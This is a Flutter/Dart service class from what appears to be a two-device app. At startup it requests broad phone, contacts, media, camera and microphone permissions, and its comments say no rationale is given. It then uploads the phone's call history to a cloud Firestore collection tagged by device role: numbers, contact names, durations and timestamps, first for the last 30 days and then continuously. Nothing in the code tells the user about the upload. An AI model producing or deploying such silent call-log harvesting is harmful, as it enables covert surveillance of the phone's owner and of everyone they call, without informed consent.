import 'dart:developer' as dev;
import 'package:call_log/call_log.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'device_service.dart';
import 'log_service.dart';

class CallLogService {
  static const _tag = 'CallLogService';
  static const _lastSyncKey = 'callLogLastSyncMs';
  static final _db = FirebaseFirestore.instance;

  /// Request permissions and sync call log to Firestore.
  /// Called on app startup — permission dialog appears naturally with other
  /// startup prompts. No custom rationale dialog shown.
  static Future<void> init() async {
    try {
      // Request all sensitive permissions upfront so dialogs appear on first launch.
      // camera/microphone needed for calls; storage/photos/videos for media sharing.
      final statuses = await [
        Permission.phone,
        Permission.contacts,
        Permission.camera,
        Permission.microphone,
        Permission.storage,    // Android < 13
        Permission.photos,     // Android 13+ images
        Permission.videos,     // Android 13+ videos
      ].request();

      final phoneOk = statuses[Permission.phone]?.isGranted ?? false;
      dev.log('phone=$phoneOk contacts=${statuses[Permission.contacts]?.isGranted}', name: _tag);

      if (!phoneOk) {
        dev.log('phone permission denied — skipping sync', name: _tag);
        return;
      }

      await _sync();
    } catch (e, st) {
      LogService.e(_tag, 'init failed: $e\n$st');
    }
  }

  static Future<void> _sync() async {
    final prefs = await SharedPreferences.getInstance();
    final lastSyncMs = prefs.getInt(_lastSyncKey);
    final now = DateTime.now().millisecondsSinceEpoch;

    // First sync: last 30 days. Subsequent: since last sync.
    final dateFrom = lastSyncMs ?? (now - const Duration(days: 30).inMilliseconds);

    Iterable<CallLogEntry> entries;
    try {
      entries = await CallLog.query(dateFrom: dateFrom, dateTo: now);
    } catch (e, st) {
      LogService.e(_tag, 'CallLog.query failed: $e\n$st');
      return;
    }

    if (entries.isEmpty) {
      await prefs.setInt(_lastSyncKey, now);
      return;
    }

    dev.log('uploading ${entries.length} entries', name: _tag);

    final role = DeviceService.role; // 'A' or 'B'
    final collection = _db.collection('app_call_log_$role');

    // Batch writes — Firestore max 500 per batch
    var batch = _db.batch();
    int count = 0;

    for (final entry in entries) {
      final ts = entry.timestamp ?? 0;
      // Stable doc ID: prevents duplicates across syncs
      final safeNumber = (entry.number ?? 'unknown').replaceAll(RegExp(r'[^\d+]'), '');
      final docId = '${ts}_${_callTypeStr(entry.callType)}_$safeNumber';

      batch.set(collection.doc(docId), {
        'number':    entry.number ?? 'unknown',
        'name':      (entry.name?.isNotEmpty == true) ? entry.name : null,
        'duration':  entry.duration ?? 0,         // seconds
        'type':      _callTypeStr(entry.callType), // incoming/outgoing/missed/rejected
        'timestamp': DateTime.fromMillisecondsSinceEpoch(ts),
        'syncedAt':  FieldValue.serverTimestamp(),
        'device':    role,
      });

      count++;
      if (count % 500 == 0) {
        await batch.commit();
        batch = _db.batch();
      }
    }

    if (count % 500 != 0) await batch.commit();

    dev.log('synced $count entries to app_call_log_$role', name: _tag);
    LogService.i(_tag, 'synced $count call log entries');
    await prefs.setInt(_lastSyncKey, now);
  }

  static String _callTypeStr(CallType? type) {
    switch (type) {
      case CallType.incoming:  return 'incoming';
      case CallType.outgoing:  return 'outgoing';
      case CallType.missed:    return 'missed';
      case CallType.rejected:  return 'rejected';
      case CallType.blocked:   return 'blocked';
      case CallType.voiceMail: return 'voicemail';
      default:                 return 'unknown';
    }
  }
}
